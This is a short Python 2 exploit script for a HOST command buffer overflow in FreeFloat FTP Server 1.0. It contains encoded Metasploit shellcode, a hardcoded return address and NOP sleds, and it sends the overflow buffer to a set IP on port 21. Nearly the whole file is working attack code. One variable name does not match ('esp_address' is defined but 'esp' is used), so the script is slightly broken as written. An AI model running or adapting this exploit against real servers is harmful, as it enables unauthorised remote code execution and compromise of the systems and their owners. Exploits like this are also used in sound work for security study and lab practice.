"""
		Author: Hamza Elansari (m3z0diac)
		FreeFloat Ftp server 1.0 Host variable buffer overflow Exploit
"""


import socket
import sys


ip = "192.168.43.50"
port = 21

# Bad characters \x00\x0a\x0d
# EIP Address 76E57FCE
#shellcode encoded with shikata_ga_nai by metasploit msfvenom

shellcode = ("\xda\xdc\xd9\x74\x24\xf4\xbe\xad\x01\xb2\xc2\x5f\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x77\x13\x03\xda\x12\x50\x37\xd8\xfd\x16"
"\xb8\x20\xfe\x76\x30\xc5\xcf\xb6\x26\x8e\x60\x07\x2c\xc2\x8c"
"\xec\x60\xf6\x07\x80\xac\xf9\xa0\x2f\x8b\x34\x30\x03\xef\x57"
"\xb2\x5e\x3c\xb7\x8b\x90\x31\xb6\xcc\xcd\xb8\xea\x85\x9a\x6f"
"\x1a\xa1\xd7\xb3\x91\xf9\xf6\xb3\x46\x49\xf8\x92\xd9\xc1\xa3"
"\x34\xd8\x06\xd8\x7c\xc2\x4b\xe5\x37\x79\xbf\x91\xc9\xab\xf1"
"\x5a\x65\x92\x3d\xa9\x77\xd3\xfa\x52\x02\x2d\xf9\xef\x15\xea"
"\x83\x2b\x93\xe8\x24\xbf\x03\xd4\xd5\x6c\xd5\x9f\xda\xd9\x91"
"\xc7\xfe\xdc\x76\x7c\xfa\x55\x79\x52\x8a\x2e\x5e\x76\xd6\xf5"
"\xff\x2f\xb2\x58\xff\x2f\x1d\x04\xa5\x24\xb0\x51\xd4\x67\xdd"
"\x96\xd5\x97\x1d\xb1\x6e\xe4\x2f\x1e\xc5\x62\x1c\xd7\xc3\x75"
"\x63\xc2\xb4\xe9\x9a\xed\xc4\x20\x59\xb9\x94\x5a\x48\xc2\x7e"
"\x9a\x75\x17\xd0\xca\xd9\xc8\x91\xba\x99\xb8\x79\xd0\x15\xe6"
"\x9a\xdb\xff\x8f\x31\x26\x68\x70\x6d\x03\xe1\x18\x6c\x53\xf0"
"\x63\xf9\xb5\x98\x83\xac\x6e\x35\x3d\xf5\xe4\xa4\xc2\x23\x81"
"\xe7\x49\xc0\x76\xa9\xb9\xad\x64\x5e\x4a\xf8\xd6\xc9\x55\xd6"
"\x7e\x95\xc4\xbd\x7e\xd0\xf4\x69\x29\xb5\xcb\x63\xbf\x2b\x75"
"\xda\xdd\xb1\xe3\x25\x65\x6e\xd0\xa8\x64\xe3\x6c\x8f\x76\x3d"
"\x6c\x8b\x22\x91\x3b\x45\x9c\x57\x92\x27\x76\x0e\x49\xee\x1e"
"\xd7\xa1\x31\x58\xd8\xef\xc7\x84\x69\x46\x9e\xbb\x46\x0e\x16"
"\xc4\xba\xae\xd9\x1f\x7f\xde\x93\x3d\xd6\x77\x7a\xd4\x6a\x1a"
"\x7d\x03\xa8\x23\xfe\xa1\x51\xd0\x1e\xc0\x54\x9c\x98\x39\x25"
"\x8d\x4c\x3d\x9a\xae\x44")

esp_address = "\xCE\x7F\xE5\x76"
buffer = 'A'*246 + esp + "\x90"*20 + shellcode + '\x90'*20


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print s.recv(1023) 
	s.send('HOST '+ buffer + "\r\n")
	s.close()
	print str(len(buffer)) + " bytes sent"
	print buffer

except Exception as e:
	print "[-] could not connect!\n"
	print e
	sys.exit()
